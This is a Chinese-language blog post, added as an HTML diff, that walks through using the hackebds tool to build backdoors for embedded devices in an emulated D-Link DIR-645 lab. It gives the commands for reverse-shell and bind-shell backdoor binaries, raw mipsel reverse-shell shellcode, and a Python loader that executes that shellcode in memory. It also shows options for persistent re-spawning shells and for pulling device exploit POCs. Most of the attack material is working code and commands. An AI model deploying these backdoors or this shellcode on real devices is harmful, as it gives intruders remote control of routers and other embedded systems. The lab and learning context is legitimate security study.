@@ -1,0 +1,316 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>嵌入式设备后门工具的利用 | Bosh's Blog</title><meta name="author" content="bosh"><meta name="copyright" content="bosh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="嵌入式设备后门工具的利用这里笔者也是直接跟着作者进行漏洞利用复现的 这里贴出师傅的文章：嵌入式设备后门与shellcode生成工具 简介hackebds是嵌入到设备的工具，它有以下几种功能：  生成各种架构的后门程序，后门程序是用于反向shell汇编代码打包的，大小很小，且纯静态，现目前支持rmv5、Armv7、Armv8、mipsel和mips，mips64，mips64el，powerpc，p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="嵌入式设备后门工具的利用">
+<meta property="og:url" content="http://example.com/2025/03/20/%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%90%8E%E9%97%A8%E4%B8%8Eshellcode%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/index.html">
+<meta property="og:site_name" content="Bosh&#39;s Blog">
+<meta property="og:description" content="嵌入式设备后门工具的利用这里笔者也是直接跟着作者进行漏洞利用复现的 这里贴出师傅的文章：嵌入式设备后门与shellcode生成工具 简介hackebds是嵌入到设备的工具，它有以下几种功能：  生成各种架构的后门程序，后门程序是用于反向shell汇编代码打包的，大小很小，且纯静态，现目前支持rmv5、Armv7、Armv8、mipsel和mips，mips64，mips64el，powerpc，p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z-bosh.github.io/img/leak3.jpg">
+<meta property="article:published_time" content="2025-03-20T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-22T05:33:37.588Z">
+<meta property="article:author" content="bosh">
+<meta property="article:tag" content="linux、Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z-bosh.github.io/img/leak3.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/03/20/%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%90%8E%E9%97%A8%E4%B8%8Eshellcode%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        if (name && globalFn[key][name]) return
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '嵌入式设备后门工具的利用',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-22 05:33:37'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background1.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://z-bosh.github.io/img/leak3.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Bosh's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">嵌入式设备后门工具的利用</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">嵌入式设备后门工具的利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-20T00:00:00.000Z" title="发表于 2025-03-20 00:00:00">2025-03-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-22T05:33:37.588Z" title="更新于 2025-03-22 05:33:37">2025-03-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="嵌入式设备后门工具的利用"><a href="#嵌入式设备后门工具的利用" class="headerlink" title="嵌入式设备后门工具的利用"></a>嵌入式设备后门工具的利用</h1><p>这里笔者也是直接跟着作者进行漏洞利用复现的</p>
+<p>这里贴出师傅的文章：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-275619.htm#msg_header_h3_2">嵌入式设备后门与shellcode生成工具</a></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>hackebds</strong>是嵌入到设备的工具，它有以下几种功能：</p>
+<ul>
+<li>生成各种架构的后门程序，后门程序是用于反向shell汇编代码打包的，大小很小，且纯静态，现目前支持<strong>rmv5、Armv7、Armv8、mipsel和mips，mips64，mips64el，powerpc，powerpc64，sparc，riscv64，mipsn32</strong>。</li>
+<li>在攻击过程找那个生成各种架构的<strong>反向shell代码</strong>，且无空字节，有助于攻击嵌入式设备上的内存损害漏洞。</li>
+<li>生成各种架构的bind_shell</li>
+<li>针对嵌入式设备存在可利用的漏洞POC或EXP进行整理，在使用中可以通过搜索输出设备型号输得基本信息与POC。</li>
+<li>支持命令行生成后门和代买外壳，特点是轻便、小巧、高效、快速。</li>
+</ul>
+<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pip3 install -U hackebds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">########################################################################################################</span></span><br><span class="line">bbq@ubuntu:~/tools$ hackebds -h</span><br><span class="line">/home/bbq/.local/lib/python3.8/site-packages/fuzzywuzzy/fuzz.py:11: UserWarning: Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning</span><br><span class="line">  warnings.warn(<span class="string">&#x27;Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning&#x27;</span>)</span><br><span class="line">usage: </span><br><span class="line"></span><br><span class="line">This tool is used <span class="keyword">for</span> backdoor,shellcode generation,Information retrieval and POC arrangement <span class="keyword">for</span> various architecture devices</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -reverse_ip REVERSE_IP, -lhost REVERSE_IP</span><br><span class="line">                        reverse_ip <span class="built_in">set</span></span><br><span class="line">  -reverse_port REVERSE_PORT, -lport REVERSE_PORT</span><br><span class="line">                        reverse_port <span class="built_in">set</span></span><br><span class="line">  -<span class="built_in">arch</span> &#123;aarch64,android,armebv5,armebv7,armelv5,armelv7,mips,mips64,mipsel,mips64el,mipsn32,mipsn32el,powerpc,powerpc64,powerpc64le,powerpcle,riscv64,sparc,sparc64,x64,x86&#125;</span><br><span class="line">                        Target <span class="built_in">arch</span> architecturet</span><br><span class="line">  -res &#123;reverse_shell_file,reverse_shellcode,bind_shell,cmd_file,cveinfo&#125;</span><br><span class="line">  -passwd PASSWD        bind_shell <span class="built_in">set</span> connect passwd</span><br><span class="line">  -model MODEL, -m MODEL</span><br><span class="line">                        device model,learn module</span><br><span class="line">  -bind_port BIND_PORT, -<span class="built_in">bind</span> BIND_PORT</span><br><span class="line">                        bind_shell port</span><br><span class="line">  -filename FILENAME, -f FILENAME</span><br><span class="line">                        Generate file name</span><br><span class="line">  -shell SHELL          cmd shell or execute file path</span><br><span class="line">  -cmd CMD              Commands executed</span><br><span class="line">  -envp ENVP            Commands envp</span><br><span class="line">  -<span class="built_in">sleep</span> SLEEP          the interval time <span class="keyword">in</span> the continuous bounce shell, <span class="keyword">in</span> seconds default is 5</span><br><span class="line">  -encode, --encode     encode backdoor</span><br><span class="line">  -power, --power       powerful reverse shell_file or bind_shell file</span><br><span class="line">  -s, --search          Basic information and POC of search device</span><br><span class="line">  -l, --list            <span class="built_in">print</span> model information list</span><br><span class="line">  -p, --poc             generated model<span class="string">&#x27;s POC file</span></span><br><span class="line"><span class="string">  -v, --version         Display version</span></span><br><span class="line"><span class="string">  -CVE CVE, --CVE CVE   CVE ID</span></span><br><span class="line"><span class="string">  -add, --add_model     Add model tree&#x27;</span>s node</span><br><span class="line">bbq@ubuntu:~/tools$ </span><br></pre></td></tr></table></figure>
+
+<p>然后作者介绍了好多种生成对应各种架构的后门程序，怎么说，笔者这里也是有点小蒙。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>简单试一下吧，这里笔者的漏洞设备是<strong>D-Link DIR-645</strong>，可以参考笔者这篇文章：<a target="_blank" rel="noopener" href="https://z-bosh.github.io/2024/12/29/CNVD-2013-11625/">CNVD-2013-11625</a></p>
+<h2 id="尝试漏洞利用"><a href="#尝试漏洞利用" class="headerlink" title="尝试漏洞利用"></a>尝试漏洞利用</h2><h3 id="生成后门程序"><a href="#生成后门程序" class="headerlink" title="生成后门程序"></a>生成后门程序</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><ul>
+<li>这里笔者也是尝试了一下反弹mipsel架构的设备后门程序。因为网卡是自己配的，所以ip和端口都是知道的。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackebds -reverse_ip 192.168.100.254 -reverse_port 9999 -<span class="built_in">arch</span> mipsel -res reverse_shell_file</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这里生成之后我们还是用scp传进模拟环境</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp mips-backdoor-Mwpn  root@192.168.100.2:/ </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>传进去之后，监听9999端口，给文件一个可执行权限，之后运行该文件也是成功反弹上shell了</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202503211650173.png" alt="image-20250321165055825"></p>
+<ul>
+<li>结束的话，终止这边的<strong>反弹shell</strong>即可</li>
+</ul>
+<blockquote>
+<p>这里默认反向shell的使用的是<strong>sh</strong>，如果是使用bash则更改命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;hackebds -reverse_ip 192.168.100.254 -reverse_port 9999 -<span class="built_in">arch</span> mipsel -res reverse_shell_file -shell bash</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>quem指令</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;ps aux | grep qemu <span class="comment">#查看进程</span></span><br><span class="line">&gt;<span class="built_in">kill</span> -9 XXXX       <span class="comment">#终结进程</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="正向弹shell"><a href="#正向弹shell" class="headerlink" title="正向弹shell"></a>正向弹shell</h4><ul>
+<li>望文生义，就是正向弹shell</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackebds -bind_port 9999 -<span class="built_in">arch</span> mipsel -res bind_shell -passwd aaaa</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>老样子scp传进去，运行程序,这边正向连接<code>nc 192.168.100.2 9999</code></li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202503212136235.png" alt="image-20250321213553871"></p>
+<h3 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h3><ul>
+<li>这块生成的shellcode也是试了一下</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hackebds -reverse_ip 192.168.100.254 -reverse_port 9999 -<span class="built_in">arch</span> mipsel -res reverse_shellcode</span><br><span class="line"><span class="comment">#########################################################################################################</span></span><br><span class="line"></span><br><span class="line">\xfd\xff\x19\x24\x27\x20\x20\x03\xfd\xff\x19\x24\x27\x28\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xd8\xf0\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\x64\xfe\x09\x3c\xc0\xa8\x29\x35\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\x26\x50\x4a\x01\x25\x28\x40\x01\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里笔者以为会像免杀一样，要写一个加载器之类的。这里也是直接拷打GPT,写了个python文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> mmap</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># MIPSEL Shellcode</span></span><br><span class="line">shellcode = <span class="string">b&quot;\xfd\xff\x19\x24\x27\x20\x20\x03\xfd\xff\x19\x24\x27\x28\x20\x03&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\xff\xff\x06\x28\x57\x10\x02\x34\x0c\x01\x01\x01\xfc\xff\xa2\xaf&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\xfc\xff\xb0\x8f\xd8\xf0\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\xf8\xff\xa9\xaf\x64\xfe\x09\x3c\xc0\xa8\x29\x35\xfc\xff\xa9\xaf&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\x26\x50\x4a\x01\x25\x28\x40\x01\xdf\x0f\x02\x24\x0c\x01\x01\x01&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28&quot;</span> \</span><br><span class="line">            <span class="string">b&quot;\xab\x0f\x02\x34\x0c\x01\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建可执行 mmap 区域</span></span><br><span class="line">mem = mmap.mmap(-<span class="number">1</span>, <span class="built_in">len</span>(shellcode), mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_WRITE | mmap.PROT_EXEC)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 shellcode</span></span><br><span class="line">mem.write(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 C 函数指针</span></span><br><span class="line">shell_func = ctypes.CFUNCTYPE(ctypes.c_void_p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让 Python 解释器调用 shellcode</span></span><br><span class="line">shell_func = ctypes.cast(ctypes.addressof(ctypes.c_char.from_buffer(mem)), shell_func)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Executing MIPSEL shellcode...&quot;</span>)</span><br><span class="line">shell_func()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>直接就反弹shell了</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202503212054696.png" alt="image-20250321205426497"></p>
+<h3 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h3><ul>
+<li>如果需要生成后门不断地创建反向shell</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -<span class="built_in">arch</span> armelv7 -res reverse_shell_file -shell bash -power</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果需要每5秒创建一次反向shell</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -<span class="built_in">arch</span> mipsel -res reverse_shell_file -power -<span class="built_in">sleep</span> 5</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>生成cmd_file，只需要指定-cmd参数即可生成各种架构执行对应命令的程序</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackebds  -cmd <span class="string">&quot;ls -al /&quot;</span> -<span class="built_in">arch</span> mipsel  -res cmd_file</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>列出设备模块</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackebds -l</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>对设备进行检索</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install python-levenshtein <span class="comment">#增加对设备检索的速度</span></span><br><span class="line">hackebds -model mipsel -s</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>生成设备对应的POC可以使用-p或者–poc，如果POC与EXP是python脚本那么会生成脚本文件(.py)</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackebds -model ex200 -p</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>对CVE进行检索</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackebds -CVE CVE-2019-17621</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>  怎么说呢？这里笔者只试了三种方法，还有几种没用试，觉得也很不错，工具绝对是物超所值。感谢作者的工具对我的漏洞利用提供了莫大的帮助，在这里再次感谢作者。下方贴出作者的github工具地址。</p>
+<p>感谢师傅写的工具：<a target="_blank" rel="noopener" href="https://github.com/doudoudedi/hackEmbedded/tree/main">doudoudedi&#x2F;hackEmbedded</a>，喜欢这个工具的可以给作者点一个星星。</p>
+<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/202503212136365.png" alt="image-20250321213653336"></p>
+<p><strong>特别感谢：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.next-infinite.top/">inf_师傅</a></p>
+<blockquote>
+<p>感谢师傅对笔者的莫大帮助！！！</p>
+</blockquote>
